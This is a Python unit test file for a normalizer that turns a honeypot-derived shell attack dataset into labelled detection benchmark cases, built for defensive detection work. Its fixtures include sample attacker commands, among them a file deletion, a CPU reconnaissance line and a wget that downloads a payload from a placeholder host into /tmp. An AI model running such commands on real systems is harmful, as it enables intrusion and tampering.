#!/usr/bin/env python3
# Copyright 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: Apache-2.0

import json
import tempfile
import unittest
from pathlib import Path

import benchmark_normalize as normalizer

LOCKED = {
    "id": "shell-attack-evolution",
    "revision": "d201aafbbcbb5347078ca64f06c5428fa6814bc9",
    "license": "CC-BY-4.0",
    "redistribution": "download-only",
}


def write_jsonl(path: Path, rows: list[dict[str, object]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "".join(json.dumps(row, sort_keys=True) + "\n" for row in rows),
        encoding="utf-8",
    )


class ShellAttackEvolutionNormalizerTest(unittest.TestCase):
    def setUp(self) -> None:
        normalizer.ADAPTER_STATISTICS.clear()

    def test_curated_harm_label_never_becomes_atomic_block_truth(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            command = "rm .s; exit"
            write_jsonl(
                root / "request_response" / "curated.jsonl",
                [
                    {
                        "session_id": "session-7",
                        "period": "2021_2022",
                        "turn_index": 3,
                        "command": command,
                        "response": "",
                        "system_change": "A file was removed.",
                        "severity_vi": 4,
                        "response_source": "curated_ubuntu",
                    }
                ],
            )
            (root / "commands").mkdir()

            cases = list(normalizer.adapt_shell_attack(root, LOCKED, "development"))

        self.assertEqual(len(cases), 1)
        case = cases[0]
        self.assertEqual(case["payload"]["command"], command)
        self.assertNotIn("argv", case["payload"])
        self.assertEqual(case["truth"]["source_truth"], "malicious")
        self.assertEqual(case["truth"]["deterministic_truth"], "contextual_or_dual_use")
        self.assertEqual(case["truth"]["expected_disposition"], "detect_only")
        self.assertEqual(case["truth"]["label_confidence"], "medium")
        self.assertIn("harm-vi-4", case["truth"]["categories"])

    def test_zero_harm_reconnaissance_is_not_relabeled_benign(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write_jsonl(
                root / "request_response" / "curated.jsonl",
                [
                    {
                        "session_id": "session-8",
                        "period": "2021_2022",
                        "turn_index": 0,
                        "command": "cat /proc/cpuinfo | grep name | wc -l",
                        "severity_vi": 0,
                    }
                ],
            )
            (root / "commands").mkdir()

            case = next(normalizer.adapt_shell_attack(root, LOCKED, "development"))

        self.assertEqual(case["truth"]["source_truth"], "malicious")
        self.assertEqual(case["truth"]["expected_disposition"], "detect_only")
        self.assertEqual(case["truth"]["deterministic_truth"], "contextual_or_dual_use")

    def test_command_corpus_preserves_real_arguments_without_invention(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            write_jsonl(root / "request_response" / "curated.jsonl", [])
            command = "wget https://example.invalid/payload -O /tmp/payload"
            write_jsonl(
                root / "commands" / "2024.jsonl",
                [
                    {
                        "command": command,
                        "period": "2024",
                        "frequency": 9,
                        "is_complex": False,
                        "command_pattern": "wget <url> -O <path>",
                    }
                ],
            )

            cases = list(normalizer.adapt_shell_attack(root, LOCKED, "development"))

        self.assertEqual(len(cases), 1)
        self.assertEqual(cases[0]["payload"]["command"], command)
        self.assertEqual(cases[0]["payload"]["dialect"], "posix")
        self.assertNotIn("argv", cases[0]["payload"])
        self.assertEqual(
            cases[0]["truth"]["label_source"],
            "shell-attack-evolution:honeypot-capture",
        )
        self.assertEqual(
            normalizer.ADAPTER_STATISTICS["shell-attack-evolution"]["command_source_rows"],
            1,
        )


if __name__ == "__main__":
    unittest.main()
